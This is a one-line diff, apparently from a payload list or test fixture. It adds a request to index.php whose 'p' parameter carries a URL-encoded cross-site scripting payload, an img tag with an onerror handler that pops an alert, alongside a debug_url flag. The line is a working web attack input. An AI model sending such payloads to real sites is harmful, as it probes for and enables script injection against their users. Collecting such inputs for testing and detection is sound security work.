@@ -1,0 +1,1 @@
+/index.php?p=%3Cimg%20src%20onerror=alert(/XSS/)%3E&debug_url=1
